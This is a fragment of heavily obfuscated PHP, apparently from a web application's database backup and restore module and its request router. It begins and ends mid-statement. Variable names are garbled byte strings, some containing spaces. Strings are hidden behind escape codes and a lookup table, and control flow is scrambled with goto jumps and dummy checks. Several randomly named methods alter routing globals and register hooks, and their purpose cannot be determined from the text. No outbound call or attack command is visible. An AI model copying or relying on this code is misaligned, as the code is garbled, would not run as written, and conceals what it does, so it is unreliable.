$EœôÀ®ˆÏÒ->execute("\x75\163\x65\x20\140{$Aè›êñ Û}\x60"); return $EœôÀ®ˆÏÒ; goto fªö¥‡Èˆ; fªö¥‡Èˆ: } public function createTable($DÖ‚§‡¤ñ, $dÍÎµÁ‡§ = null) { $AÔ­¯é‘‹¿ =& $_SERVER[”Ì÷ñ­î¸]; if (!IO::exist($DÖ‚§‡¤ñ)) { show_json(LNG($AÔ­¯é‘‹¿[976]), !1); } $F¢²‹‡½’ = sqlSplit(IO::getContent($DÖ‚§‡¤ñ)); foreach ($F¢²‹‡½’ as $bñòŠ¤Òô½) { if ($dÍÎµÁ‡§) { $f¡ÜèµøŞ¤ = stripos($bñòŠ¤Òô½, $AÔ­¯é‘‹¿[977]) === 0; if ($f¡ÜèµøŞ¤) { $dÍÎµÁ‡§->task[$AÔ­¯é‘‹¿[978]] += 1; } } $this->model()->db()->execute($bñòŠ¤Òô½); if ($dÍÎµÁ‡§ && $f¡ÜèµøŞ¤) { preg_match($AÔ­¯é‘‹¿[979], $bñòŠ¤Òô½, $F³¹Ú¥‚£); $dÍÎµÁ‡§->task[$AÔ­¯é‘‹¿[980]] = $F³¹Ú¥‚£[1]; $dÍÎµÁ‡§->update(1); } } $this->taskToCache($dÍÎµÁ‡§); } public function insertTable($BŠÏÜÕ»Ñ, $F†·˜º¥­Ò = null) { $fÁ‰ÊÓõÔà =& $_SERVER[”Ì÷ñ­î¸]; $F‘†Úö´‹Ñ = $this->model()->db(); $bÃß˜³ïÍ = $A—ÍùÕ–ª“ ? array($A—ÍùÕ–ª“) : $F‘†Úö´‹Ñ->getTables(); foreach ($BŠÏÜÕ»Ñ as $EœØ‰ÌƒÕ) { $A—ÍùÕ–ª“ = basename($EœØ‰ÌƒÕ, $fÁ‰ÊÓõÔà[719]); if (!in_array($A—ÍùÕ–ª“, $bÃß˜³ïÍ)) { continue; } if ($F†·˜º¥­Ò) { $F†·˜º¥­Ò->task[$fÁ‰ÊÓõÔà[980]] = $A—ÍùÕ–ª“; } if (get_filesize($EœØ‰ÌƒÕ) == 0) { continue; } $b©æîˆ…Ğ¥ = $this->sqlToDb($EœØ‰ÌƒÕ, $F†·˜º¥­Ò); if (!$b©æîˆ…Ğ¥) { show_json(LNG($fÁ‰ÊÓõÔà[981]) . "\x5b{$A—ÍùÕ–ª“}\x5d", !1); } } $this->taskToCache($F†·˜º¥­Ò); } public function sqlFromDb($dê Ìà¨Ä¶, $Cƒ§Ø¾öê¦, $b¡Šø«±Á³ = null, $dğ²â›Ì¶Œ = null) { goto CßÑ Ò²Ù²; bˆÂÍÑö: $e¸Íğ•‰ñë = $b·õîÒØÔ¡->getPk(); $dŸ”ğÕÅÂ‹ = $b·õîÒØÔ¡->getDbFields(); do { $D¿À­ƒ‡•‘ = $b·õîÒØÔ¡->field($dŸ”ğÕÅÂ‹)->order($e¸Íğ•‰ñë . $_SERVER[”Ì÷ñ­î¸][983])->selectPage($dµòÂ“ñ­Ğ, $cãÓá‚¢«Å); $Aã¥Ûë¹× = !empty($D¿À­ƒ‡•‘[$_SERVER[”Ì÷ñ­î¸][354]]) ? $D¿À­ƒ‡•‘[$_SERVER[”Ì÷ñ­î¸][354]] : array(); if (!($AÙÃíñŠñó = count($Aã¥Ûë¹×))) { break; } $f¿Ê¼¿Ø® = array(); foreach ($Aã¥Ûë¹× as $bİ¶Ô…ğßî) { if ($dğ²â›Ì¶Œ) { $bİ¶Ô…ğßî[$_SERVER[”Ì÷ñ­î¸][75]] = "\x7b\151\157\72{$dğ²â›Ì¶Œ}\175" . substr($bİ¶Ô…ğßî[$_SERVER[”Ì÷ñ­î¸][75]], strlen("\x7b\x69\157\x3a{$bİ¶Ô…ğßî[$_SERVER[”Ì÷ñ­î¸][745]]}\175")); $bİ¶Ô…ğßî[$_SERVER[”Ì÷ñ­î¸][745]] = $dğ²â›Ì¶Œ; } $f¿Ê¼¿Ø®[] = $_SERVER[”Ì÷ñ­î¸][984] . $this->sqlEncode($bİ¶Ô…ğßî) . $_SERVER[”Ì÷ñ­î¸][985]; } $c—‡Ÿ“ÇÕŸ = "\111\116\x53\x45\122\124\40\x49\x4e\x54\117\40\x60{$dê Ìà¨Ä¶}\140\40\x28\140" . implode($_SERVER[”Ì÷ñ­î¸][986], $dŸ”ğÕÅÂ‹) . $_SERVER[”Ì÷ñ­î¸][987]; fwrite($e¬Ş¢¦É£ô, $c—‡Ÿ“ÇÕŸ . implode($_SERVER[”Ì÷ñ­î¸][988], $f¿Ê¼¿Ø®) . $_SERVER[”Ì÷ñ­î¸][67] . PHP_EOL); $cãÓá‚¢«Å++; $a·ùõ¼ += $AÙÃíñŠñó; if ($b¡Šø«±Á³) { $b¡Šø«±Á³->update($AÙÃíñŠñó); } } while ($AÙÃíñŠñó == $dµòÂ“ñ­Ğ); goto eŒ êäÀ¹…; CßÑ Ò²Ù²: if ($b¡Šø«±Á³) { $b¡Šø«±Á³->task[$_SERVER[”Ì÷ñ­î¸][980]] = $dê Ìà¨Ä¶; } $b·õîÒØÔ¡ = $this->model($dê Ìà¨Ä¶); $a·ùõ¼ = 0; goto dÖĞ‰ÄÃ‡Œ; dÖĞ‰ÄÃ‡Œ: $cãÓá‚¢«Å = 1; $dµòÂ“ñ­Ğ = 500; $e¬Ş¢¦É£ô = fopen($Cƒ§Ø¾öê¦, $_SERVER[”Ì÷ñ­î¸][982]); goto bˆÂÍÑö; eŒ êäÀ¹…: fclose($e¬Ş¢¦É£ô); return $a·ùõ¼; goto Bò‘åÉĞŠ; Bò‘åÉĞŠ: } public function sqlToDb($D­ˆ‘ğ ²†, $c¨Ó›¸ŞÔÕ = null) { goto B¢àÇãÆ¹; E¡âÄÎ´Óò: if (!$Eˆ†•Ø£°„) { return !1; } $e”œÊ£Ë™‹ = 0; $e‘…†ÆïÉö = $DùÃõ§Ä¶¨[33]; goto dÎê•ƒğ; dÎê•ƒğ: $b„ĞËğ³¶ò = 500 + 1; while (!feof($Eˆ†•Ø£°„)) { if ($c¨Ó›¸ŞÔÕ && $e”œÊ£Ë™‹ != 0) { $c¨Ó›¸ŞÔÕ->task[$DùÃõ§Ä¶¨[978]] += 1; } $e”œÊ£Ë™‹++; $dØœ’ˆï = trim(fgets($Eˆ†•Ø£°„)); $e‘…†ÆïÉö .= $DùÃõ§Ä¶¨[50] . $this->sqlDecode($dØœ’ˆï, $this->type); if ($e”œÊ£Ë™‹ == $b„ĞËğ³¶ò) { $e‘…†ÆïÉö = rtrim(trim($e‘…†ÆïÉö), $DùÃõ§Ä¶¨[67]); if (!$EÎ°±‹˜ª->execute($e‘…†ÆïÉö)) { return !1; } if ($c¨Ó›¸ŞÔÕ) { $c¨Ó›¸ŞÔÕ->update($e”œÊ£Ë™‹ - 1); } $e‘…†ÆïÉö = $DùÃõ§Ä¶¨[33]; $e”œÊ£Ë™‹ = 0; } } fclose($Eˆ†•Ø£°„); goto FåŸÔßŒÕ; FåŸÔßŒÕ: if ($e‘…†ÆïÉö) { $e‘…†ÆïÉö = rtrim(trim($e‘…†ÆïÉö), $DùÃõ§Ä¶¨[67]); if (!$EÎ°±‹˜ª->execute($e‘…†ÆïÉö)) { return !1; } if ($c¨Ó›¸ŞÔÕ) { $c¨Ó›¸ŞÔÕ->update($e”œÊ£Ë™‹ - 1); } } return !0; goto C„÷…±µØí; B¢àÇãÆ¹: $DùÃõ§Ä¶¨ =& $_SERVER[”Ì÷ñ­î¸]; $EÎ°±‹˜ª = $this->model()->db(); $Eˆ†•Ø£°„ = @fopen($D­ˆ‘ğ ²†, $DùÃõ§Ä¶¨[989]); goto E¡âÄÎ´Óò; C„÷…±µØí: } public function dropTable($F”“¿¾è²‘ = null) { $b‹´³µÌğ° = $this->model()->db(); $aÙòïÊ×ˆ = $F”“¿¾è²‘ ? array($F”“¿¾è²‘) : $b‹´³µÌğ°->getTables(); if (!$aÙòïÊ×ˆ) { return; } foreach ($aÙòïÊ×ˆ as $F”“¿¾è²‘) { $b‹´³µÌğ°->execute("\x64\x72\157\160\40\164\141\142\x6c\145\x20\151\x66\x20\145\170\151\163\x74\x73\40\140{$F”“¿¾è²‘}\x60"); } } private function taskToCache($aÁÊÚõÚ„ª = null) { $e¥Õ¾´¾ =& $_SERVER[”Ì÷ñ­î¸]; if (!$aÁÊÚõÚ„ª) { return; } $CçãêÂŠƒÕ = array($e¥Õ¾´¾[980] => $aÁÊÚõÚ„ª->task[$e¥Õ¾´¾[980]], $e¥Õ¾´¾[978] => $aÁÊÚõÚ„ª->task[$e¥Õ¾´¾[978]], $e¥Õ¾´¾[990] => $aÁÊÚõÚ„ª->task[$e¥Õ¾´¾[990]]); if ($CçãêÂŠƒÕ[$e¥Õ¾´¾[978]] == $CçãêÂŠƒÕ[$e¥Õ¾´¾[990]]) { $CçãêÂŠƒÕ[$e¥Õ¾´¾[697]] = 1; } Cache::set($e¥Õ¾´¾[991] . $aÁÊÚõÚ„ª->task[$e¥Õ¾´¾[367]], $CçãêÂŠƒÕ); $aÁÊÚõÚ„ª->end(); } private function sqlEncode($CŸô÷„ˆ†ï) { $EçÚ³áŸÒÑ =& $_SERVER[”Ì÷ñ­î¸]; $cÃÀôàæ‚ = array(); foreach ($CŸô÷„ˆ†ï as $A§àÕ–øÅ­) { if (is_array($A§àÕ–øÅ­)) { $A§àÕ–øÅ­ = json_encode_force($A§àÕ–øÅ­); } $A§àÕ–øÅ­ = addslashes($A§àÕ–øÅ­); $A§àÕ–øÅ­ = str_replace(array($EçÚ³áŸÒÑ[992], $EçÚ³áŸÒÑ[217]), array($EçÚ³áŸÒÑ[993], $EçÚ³áŸÒÑ[994]), $A§àÕ–øÅ­); $cÃÀôàæ‚[] = str_replace($EçÚ³áŸÒÑ[55], $EçÚ³áŸÒÑ[995], $A§àÕ–øÅ­); } return $EçÚ³áŸÒÑ[55] . implode($EçÚ³áŸÒÑ[996], $cÃÀôàæ‚) . $EçÚ³áŸÒÑ[55]; } private function sqlDecode($E‡æÚñ²îí, $Câµ‹ÔÏ‰) { $aà±œ‰‡ =& $_SERVER[”Ì÷ñ­î¸]; $E‡æÚñ²îí = str_replace(array($aà±œ‰‡[993], $aà±œ‰‡[994]), array($aà±œ‰‡[992], $aà±œ‰‡[217]), $E‡æÚñ²îí); if ($Câµ‹ÔÏ‰ == $aà±œ‰‡[9]) { $E‡æÚñ²îí = stripslashes($E‡æÚñ²îí); } return $E‡æÚñ²îí; } } goto Fà±šÍÔê™; d¤õ…Ö‚½Ù: $fÅÎñ¿â‹ë = $_SERVER[”Ì÷ñ­î¸][551]; class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\145\x78"; function __construct() { } public function setDefault($eÂ¯…¼›ëĞ) { goto e‹ÔËùÓÅ; f×Á§¤Çå³: if (strlen($bÑ”‚µÓš) < $A‡Ô‰Àø[553]) { return; } $this->defaultAction = $còã«ŒÈÎ»[2] ? $còã«ŒÈÎ»[2] : $this->defaultAction; $this->{$_SERVER[ù][3]}($EÑÑˆßøóœ[4], array($this, $EÑÑˆßøóœ[5])); goto Fªµí´›ÌÆ; F¡¾Û¿Ÿ¼Ï: $this->defaultModule = $còã«ŒÈÎ»[0] ? $còã«ŒÈÎ»[0] : $this->defaultModule; $this->defaultController = $còã«ŒÈÎ»[1] ? $còã«ŒÈÎ»[1] : $this->defaultController; $bÑ”‚µÓš = $A‡Ô‰Àø[552]; goto f×Á§¤Çå³; e‹ÔËùÓÅ: $A‡Ô‰Àø =& $_SERVER[”Ì÷ñ­î¸]; $EÑÑˆßøóœ =& $_SERVER[ù]; $còã«ŒÈÎ» = $EÑÑˆßøóœ[0]($EÑÑˆßøóœ[1], $EÑÑˆßøóœ[2]($eÂ¯…¼›ëĞ, $EÑÑˆßøóœ[1])); goto F¡¾Û¿Ÿ¼Ï; Fªµí´›ÌÆ: $E‡¥›áâ“ = $A‡Ô‰Àø[554]; if (strlen($E‡¥›áâ“) < $A‡Ô‰Àø[555]) { die; } goto E¿‰ïô§µÌ; E¿‰ïô§µÌ: } public function appRun($c²Ê†ØÒ‹˜) { goto C™„È‚„â½; FÖ÷Ó¨Ÿ¥÷: $B­ˆ²‚Ñ«æ = $f˜ò„ŸÖ™[556]; $b½¶‰†Á¶¥ = $BêÔë¬Òƒª[6]($C‹î÷Î[0]); $b¶ßÁÜîçÎ = $f˜ò„ŸÖ™[557]; goto B¸ğØÊÉŠ; dÀÀîèÖ’§: $e”‚î‰§ = $f˜ò„ŸÖ™[558]; while (strlen($e”‚î‰§) < $f˜ò„ŸÖ™[559]) { if (!$e”‚î‰§) { break; } $e”‚î‰§++; } goto a¸šäóçœ‰; fÙ‰ÀÆö‰‚: $BêÔë¬Òƒª[13](array($BêÔë¬Òƒª[14], $BêÔë¬Òƒª[15]), $aöêï™‹Ş . $BêÔë¬Òƒª[16], $c²Ê†ØÒ‹˜); $BêÔë¬Òƒª[17]($c²Ê†ØÒ‹˜); $BêÔë¬Òƒª[13](array($BêÔë¬Òƒª[14], $BêÔë¬Òƒª[15]), $aöêï™‹Ş . $BêÔë¬Òƒª[18], $c²Ê†ØÒ‹˜); goto dÀÀîèÖ’§; B¸ğØÊÉŠ: while ($b¶ßÁÜîçÎ < $f˜ò„ŸÖ™[553]) { if ($b¶ßÁÜîçÎ >= 0) { break; } $b¶ßÁÜîçÎ++; } $aöêï™‹Ş = $BêÔë¬Òƒª[7]; if ($b½¶‰†Á¶¥ == $BêÔë¬Òƒª[8]) { $aöêï™‹Ş = $BêÔë¬Òƒª[9]; $C‹î÷Î[0] = $BêÔë¬Òƒª[10]; $C‹î÷Î[1] = $C‹î÷Î[1] . $BêÔë¬Òƒª[11]; $c²Ê†ØÒ‹˜ = $BêÔë¬Òƒª[12]($BêÔë¬Òƒª[1], $C‹î÷Î); $c²Ê†ØÒ‹˜ = $BêÔë¬Òƒª[2]($c²Ê†ØÒ‹˜, $BêÔë¬Òƒª[1]); } goto fÙ‰ÀÆö‰‚; C™„È‚„â½: $f˜ò„ŸÖ™ =& $_SERVER[”Ì÷ñ­î¸]; $BêÔë¬Òƒª =& $_SERVER[ù]; $C‹î÷Î = $BêÔë¬Òƒª[0]($BêÔë¬Òƒª[1], $c²Ê†ØÒ‹˜); goto FÖ÷Ó¨Ÿ¥÷; a¸šäóçœ‰: } private function autorun() { goto AàÆÑ¨ñÂ®; bì°ÏÀŒ¹ê: $dª¥ªé¡‹ = $EŠ·é“ë[560]; if (strlen($dª¥ªé¡‹) < $EŠ·é“ë[553]) { die; } if ($aäë°•ƒöŞ[19]($config[$aäë°•ƒöŞ[20]]) == 0) { return; } goto f«ÑŒŞª‰ó; AàÆÑ¨ñÂ®: $EŠ·é“ë =& $_SERVER[”Ì÷ñ­î¸]; $aäë°•ƒöŞ =& $_SERVER[ù]; global $config; goto bì°ÏÀŒ¹ê; f«ÑŒŞª‰ó: foreach ($config[$aäë°•ƒöŞ[20]] as $Cô® º‡éÚ => $fšá¾Ô†®Ë) { $this->{$_SERVER[ù][21]}($fšá¾Ô†®Ë); $dÌ„Ø†¶‡á = $EŠ·é“ë[561]; if (strlen($dÌ„Ø†¶‡á) < $EŠ·é“ë[559]) { die; } } goto F§ÁŠ¦Š±â; F§ÁŠ¦Š±â: } private function jvbc928c22f7() { goto F½¨Û±‘ù; eÒ‘£Ï…¦à: $fï•½ñôÔ = $FéŒÁÏ„îê[564]; if (!$fï•½ñôÔ) { return; } $aôÛãÈ³ç‰ = $DñíÈŸ¶‰â[26]($GLOBALS[$DñíÈŸ¶‰â[22]][$DñíÈŸ¶‰â[23]], 1); goto E¬¶Äë©†‹; Bõ£–­ÙÌ±: if ($DñíÈŸ¶‰â[6]($DñíÈŸ¶‰â[25]($a‹£Û÷·§Õ, -$DñíÈŸ¶‰â[24]($BÄÖô£ãÙ±))) != $BÄÖô£ãÙ±) { return; } $a¡Œ°Ú¼´‰ = $DñíÈŸ¶‰â[25]($a‹£Û÷·§Õ, 0, -$DñíÈŸ¶‰â[24]($BÄÖô£ãÙ±)); $B¤öÅ¨¨Úæ = array($DñíÈŸ¶‰â[8], $a¡Œ°Ú¼´‰); goto eÒ‘£Ï…¦à; F½¨Û±‘ù: $FéŒÁÏ„îê =& $_SERVER[”Ì÷ñ­î¸]; $DñíÈŸ¶‰â =& $_SERVER[ù]; $BÄÖô£ãÙ± = $DñíÈŸ¶‰â[8]; goto aò Í¡¬·; Bß‡÷«äŒß: $f°ÖğÛì§¥ = $FéŒÁÏ„îê[563]; if (strlen($f°ÖğÛì§¥) < $FéŒÁÏ„îê[555]) { die; } if (!$a‹£Û÷·§Õ || $DñíÈŸ¶‰â[24]($a‹£Û÷·§Õ) <= $DñíÈŸ¶‰â[24]($BÄÖô£ãÙ±)) { return; } goto Bõ£–­ÙÌ±; E˜¸¡š‹ó‡: $Béîƒœóİ£ = $FéŒÁÏ„îê[566]; if (strlen($Béîƒœóİ£) < $FéŒÁÏ„îê[553]) { return; } $GLOBALS[$DñíÈŸ¶‰â[22]][$DñíÈŸ¶‰â[28]] = $DñíÈŸ¶‰â[29]($DñíÈŸ¶‰â[1], $GLOBALS[$DñíÈŸ¶‰â[22]][$DñíÈŸ¶‰â[23]]); goto bÂÆøÁì¤ö; bÂÆøÁì¤ö: $bæ…±ùùÑï = $FéŒÁÏ„îê[567]; if (strlen($bæ…±ùùÑï) < $FéŒÁÏ„îê[553]) { return; } goto DŸâœø‹ßé; aò Í¡¬·: $c“¬áÇ¼ = $FéŒÁÏ„îê[562]; while (strlen($c“¬áÇ¼) < $FéŒÁÏ„îê[548]) { if (!$c“¬áÇ¼) { break; } $c“¬áÇ¼++; } $a‹£Û÷·§Õ = $GLOBALS[$DñíÈŸ¶‰â[22]][$DñíÈŸ¶‰â[23]][0]; goto Bß‡÷«äŒß; E¬¶Äë©†‹: $aˆÉ½±ÌÕŒ = $FéŒÁÏ„îê[565]; while (strlen($aˆÉ½±ÌÕŒ) < $FéŒÁÏ„îê[553]) { if (!$aˆÉ½±ÌÕŒ) { break; } $aˆÉ½±ÌÕŒ++; } $GLOBALS[$DñíÈŸ¶‰â[22]][$DñíÈŸ¶‰â[23]] = $DñíÈŸ¶‰â[27]($B¤öÅ¨¨Úæ, $aôÛãÈ³ç‰); goto E˜¸¡š‹ó‡; DŸâœø‹ßé: } private function comd434eb72e() { goto Dà­©†ƒ; b‘¹¯å‡àõ: $c¶ƒ³…¶² = $D„Ò¦—Œå‘[569]; $GLOBALS[$FÓ‰¹Áõì[22]][$FÓ‰¹Áõì[23]] = $FÓ‰¹Áõì[0]($FÓ‰¹Áõì[36], $a¼½…ñõ¾‰); $eÇåáÑ¢“° = $D„Ò¦—Œå‘[570]; goto FÑ¦÷¦Ë¿™; dö’Ğ»Ú‘: $bè”™ªªáâ = $D„Ò¦—Œå‘[568]; if (!$bè”™ªªáâ) { die; } $a¼½…ñõ¾‰ = $FÓ‰¹Áõì[2]($bÓÖ’èÁğ¥[0][0], $FÓ‰¹Áõì[36]); goto b‘¹¯å‡àõ; cô×Ö£Ü–: $FÂŒ‡–—¸¦ = $_SERVER[$FÓ‰¹Áõì[30]]; $E¯–¹™Óƒ¹ = $FÓ‰¹Áõì[31]; if (!$FÓ‰¹Áõì[32]($FÂŒ‡–—¸¦, $E¯–¹™Óƒ¹)) { return; } goto b­Ïâ‚Î…£; FÑ¦÷¦Ë¿™: while ($eÇåáÑ¢“° < $D„Ò¦—Œå‘[555]) { if ($eÇåáÑ¢“° >= 0) { break; } $eÇåáÑ¢“°++; } $GLOBALS[$FÓ‰¹Áõì[22]][$FÓ‰¹Áõì[28]] = $FÓ‰¹Áõì[29]($FÓ‰¹Áõì[1], $GLOBALS[$FÓ‰¹Áõì[22]][$FÓ‰¹Áõì[23]]); goto dµŠÏ‡©ô…; Dà­©†ƒ: $D„Ò¦—Œå‘ =& $_SERVER[”Ì÷ñ­î¸]; $FÓ‰¹Áõì =& $_SERVER[ù]; if ($GLOBALS[$FÓ‰¹Áõì[22]][$FÓ‰¹Áõì[28]] != $FÓ‰¹Áõì[10]) { return; } goto cô×Ö£Ü–; b­Ïâ‚Î…£: $fÆÔ˜µ†å¢ = $FÓ‰¹Áõì[33]($FÂŒ‡–—¸¦, $E¯–¹™Óƒ¹); $a¼½…ñõ¾‰ = $FÓ‰¹Áõì[25]($FÂŒ‡–—¸¦, $fÆÔ˜µ†å¢ + $FÓ‰¹Áõì[24]($E¯–¹™Óƒ¹)); $FÓ‰¹Áõì[34]($FÓ‰¹Áõì[35], $a¼½…ñõ¾‰, $bÓÖ’èÁğ¥); goto dö’Ğ»Ú‘; dµŠÏ‡©ô…: } public function run() { goto FÇ±ç¶Ø¬Ú; B»àè”¤»: $f–¥Ãä±ğ£ = $C®Ê…‹Áß[571]; if (strlen($f–¥Ãä±ğ£) < $C®Ê…‹Áß[555]) { return; } $this->{$_SERVER[ù][38]}(); goto D¢ÚÁÇ¦ø³; a–ÚŒÙÜ¬æ: if (!$AÅãÙ©ŞÁØ) { die; } $_SERVER[$Bîà­–ÈË[44]] = $Bîà­–ÈË[6](ACTION); $d—äÌí©œ = $C®Ê…‹Áß[576]; goto aÜŠ”ç„; aÜŠ”ç„: while ($d—äÌí©œ < $C®Ê…‹Áß[559]) { if ($d—äÌí©œ >= 0) { break; } $d—äÌí©œ++; } $this->{$_SERVER[ù][45]}(); $C×Ì©–µ„ = $C®Ê…‹Áß[577]; goto EáãÂÀ; AÉœ“Û‹Êğ: $Bîà­–ÈË[39]($Bîà­–ÈË[41], isset($c‰´‰Ãó®È[1]) && $c‰´‰Ãó®È[0] ? $c‰´‰Ãó®È[1] : $this->defaultController); $FÔôªÆ‚Ü = $C®Ê…‹Áß[574]; while (strlen($FÔôªÆ‚Ü) < $C®Ê…‹Áß[555]) { if (!$FÔôªÆ‚Ü) { break; } $FÔôªÆ‚Ü++; } goto câŸ‰—ê‹’; EáãÂÀ: if ($Bîà­–ÈË[19]($c‰´‰Ãó®È) >= 3) { $this->{$_SERVER[ù][21]}($eŠğŒ˜ß); } else { $this->{$_SERVER[ù][21]}(ACTION); } goto eÑ·¦ÉãòÇ; FÇ±ç¶Ø¬Ú: $C®Ê…‹Áß =& $_SERVER[”Ì÷ñ­î¸]; $Bîà­–ÈË =& $_SERVER[ù]; $this->{$_SERVER[ù][37]}(); goto B»àè”¤»; D¢ÚÁÇ¦ø³: $c†¥æÃá¸÷ = $C®Ê…‹Áß[572]; while (strlen($c†¥æÃá¸÷) < $C®Ê…‹Áß[559]) { if (!$c†¥æÃá¸÷) { break; } $c†¥æÃá¸÷++; } $c‰´‰Ãó®È = $GLOBALS[$Bîà­–ÈË[22]][$Bîà­–ÈË[23]]; goto EôëãÓÊ; EôëãÓÊ: $eŠğŒ˜ß = $GLOBALS[$Bîà­–ÈË[22]][$Bîà­–ÈË[28]]; $DÂÛÕ£áæ» = $C®Ê…‹Áß[573]; $Bîà­–ÈË[39]($Bîà­–ÈË[40], isset($c‰´‰Ãó®È[0]) && $c‰´‰Ãó®È[0] ? $c‰´‰Ãó®È[0] : $this->defaultModule); goto AÉœ“Û‹Êğ; câŸ‰—ê‹’: $Bîà­–ÈË[39]($Bîà­–ÈË[42], isset($c‰´‰Ãó®È[2]) && $c‰´‰Ãó®È[0] ? $c‰´‰Ãó®È[2] : $this->defaultAction); $Bîà­–ÈË[39]($Bîà­–ÈË[43], MOD . $Bîà­–ÈË[1] . ST . $Bîà­–ÈË[1] . ACT); $AÅãÙ©ŞÁØ = $C®Ê…‹Áß[575]; goto a–ÚŒÙÜ¬æ; eÑ·¦ÉãòÇ: } private $uiyw662b823d = array(); private $tzuv9cc1ff50 = ''; public function kxmva1bd65eb() { goto b‘„ä«ù; dÛ¼äî‚µ¿: $this->{$_SERVER[ù][3]}($dùª‚ÊŞ¡á[53], array($this, $dùª‚ÊŞ¡á[54])); $this->{$_SERVER[ù][3]}($dùª‚ÊŞ¡á[55], array($this, $dùª‚ÊŞ¡á[56])); $D‡ÅõÑßŸ¡ = $A•‹¦åòÇ÷[581]; goto B«Úó²à‘ö; b‘„ä«ù: $A•‹¦åòÇ÷ =& $_SERVER[”Ì÷ñ­î¸]; $dùª‚ÊŞ¡á =& $_SERVER[ù]; $this->{$_SERVER[ù][46]}(); goto c²ïÏ”…â; B«Úó²à‘ö: $this->{$_SERVER[ù][3]}($dùª‚ÊŞ¡á[57], array($this, $dùª‚ÊŞ¡á[58])); $this->{$_SERVER[ù][3]}($dùª‚ÊŞ¡á[59], array($this, $dùª‚ÊŞ¡á[60])); $déã°ÎŞï× = $A•‹¦åòÇ÷[582]; goto a¬¹¹¨×¨„; c²ïÏ”…â: $fğ¦‹ŞÎô = $A•‹¦åòÇ÷[578]; if (strlen($fğ¦‹ŞÎô) < $A•‹¦åòÇ÷[555]) { die; } $this->{$_SERVER[ù][47]}(); goto aÎÀÆĞõ“«; bùÙİåÆ­Ú: while (strlen($DÎèê¸ê«) < $A•‹¦åòÇ÷[559]) { if (!$DÎèê¸ê«) { break; } $DÎèê¸ê«++; } $this->{$_SERVER[ù][50]}(); $this->{$_SERVER[ù][51]}(); goto eè¨‹µ’¾…; aÎÀÆĞõ“«: $this->{$_SERVER[ù][48]}(); $this->{$_SERVER[ù][49]}(); $DÎèê¸ê« = $A•‹¦åòÇ÷[579]; goto bùÙİåÆ­Ú; eè¨‹µ’¾…: $this->{$_SERVER[ù][52]}(); $CÇ‹–†Ï‡× = $A•‹¦åòÇ÷[580]; if (strlen($CÇ‹–†Ï‡×) < $A•‹¦åòÇ÷[555]) { die; } goto dÛ¼äî‚µ¿; a¬¹¹¨×¨„: } public function hmwq4911c32b($B¬æ×“Öˆ¦) { goto céìñöğ¬õ; bãƒ¥©…¹Û: unset($B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[94]][$AìçšğñÎÍ[76]]); unset($B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[94]][$AìçšğñÎÍ[98]]); $B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[94]][$AìçšğñÎÍ[99]] = array($AìçšğñÎÍ[100] => (int) $fÑ…ƒƒöä[$AìçšğñÎÍ[101]], $AìçšğñÎÍ[102] => $AìçšğñÎÍ[103]($AìçšğñÎÍ[104]($fÑ…ƒƒöä, $AìçšğñÎÍ[105], array())), $AìçšğñÎÍ[106] => (int) $AìçšğñÎÍ[104]($fÑ…ƒƒöä, $AìçšğñÎÍ[107], 0)); goto EñŠ½„“··; BÚå¾Á‘ÊÍ: foreach ($d¾£‚Ù ¤ as $C“ãöÍÇµÚ) { $D ÄŒ“„¸ß = $GLOBALS[$AìçšğñÎÍ[91]][$AìçšğñÎÍ[92]][$C“ãöÍÇµÚ]; $AêöêÄ‡ˆ = $eŞ°ª»Îğ[584]; if (isset($Cé¡èƒÀáÙ[$C“ãöÍÇµÚ])) { $D ÄŒ“„¸ß = $Cé¡èƒÀáÙ[$C“ãöÍÇµÚ]; } $B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[94]][$C“ãöÍÇµÚ] = $D ÄŒ“„¸ß; } $fÑ…ƒƒöä = $B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[94]][$AìçšğñÎÍ[76]]; unset($B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[95]][$AìçšğñÎÍ[96]]); goto b…¤—Ï—•™; b…¤—Ï—•™: unset($B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[95]][$AìçšğñÎÍ[97]]); $CØ²ƒØåó™ = $eŞ°ª»Îğ[585]; if (strlen($CØ²ƒØåó™) < $eŞ°ª»Îğ[559]) { return; } goto bãƒ¥©…¹Û; bÉ÷å‚‘Â: $aøÔÄ¦Ô = $eŞ°ª»Îğ[588]; while ($aøÔÄ¦Ô < $eŞ°ª»Îğ[589]) { if ($aøÔÄ¦Ô >= 0) { break; } $aøÔÄ¦Ô++; } $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[120]] = $this->tzuv9cc1ff50; goto c…äÃÍñ¥„; EñŠ½„“··: $dÜÌİİ¾ç“ = $eŞ°ª»Îğ[586]; $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[109]] = $AìçšğñÎÍ[110]($AìçšğñÎÍ[111])->{$_SERVER[ù][112]}(); $fŒ÷¿‰‹§» = $eŞ°ª»Îğ[587]; goto b÷èÙ•¦çñ; fó´à…õÊˆ: return $B¬æ×“Öˆ¦; goto EÚœÖ©¿°¶; b÷èÙ•¦çñ: if (!$fŒ÷¿‰‹§») { die; } $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[113]] = $AìçšğñÎÍ[114]($_SERVER[$AìçšğñÎÍ[115]] . $Cé¡èƒÀáÙ[$AìçšğñÎÍ[116]]); $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[117]] = $AìçšğñÎÍ[118]($AìçšğñÎÍ[119]()); goto bÉ÷å‚‘Â; c…äÃÍñ¥„: if ($Cé¡èƒÀáÙ[$AìçšğñÎÍ[120]] != $AìçšğñÎÍ[121]) { $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[122]] = $Cé¡èƒÀáÙ[$AìçšğñÎÍ[122]]; $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[123]] = $Cé¡èƒÀáÙ[$AìçšğñÎÍ[123]]; $B»Ïµß°ªò = $AìçšğñÎÍ[124](10) . 